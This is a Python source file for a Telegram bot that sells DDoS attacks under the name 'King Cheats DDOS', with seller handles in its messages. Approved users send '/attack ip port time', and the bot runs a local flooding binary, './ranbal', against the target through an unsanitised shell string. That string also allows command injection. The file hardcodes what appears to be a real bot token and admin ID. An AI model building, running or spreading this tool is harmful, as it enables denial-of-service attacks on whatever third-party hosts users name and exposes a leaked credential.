import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext


TELEGRAM_BOT_TOKEN = '7559793418:AAEcYYlxpU3iR9wK_hV_Qwb-m4WFC0ddxsw' # YOUR TOKEN
ADMIN_USER_ID = 5879359815 #YOUR ID
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome To King Cheats DDOS*\n"
        "*🔥 Owner @itzmd808sahil_SELLER*\n"
        "*🔥 Channel @itzmd808sahil_SELLER*\n"
        "*🔥 Use 60 to 120 Seconds Attacks*\n"        
        "*🔥 Use /attack For Attack DDOS*"                     
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command Owner @itzmd808sahil_SELLER*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage add 12345678 For Add User And /manage rem 12345678 For Remove User*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./ranbal {ip} {port} {time} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @itzmd808sahil_SELLER*\n*🔥 Channel @itzmd808sahil_SELLER*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🤡 You need to get permission to use this bot Dm » @itzmd808sahil_SELLER*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*😔 Another User Is Sended Attack Please Wait 1 Minute To Use /attack*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🌟 Uses » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack Launched ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time} seconds*\n"
        f"*⭐ Owner @itzmd808sahil_SELLER*\n"        
        f"*⭐ Channel @itzmd808sahil_SELLER*"        
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
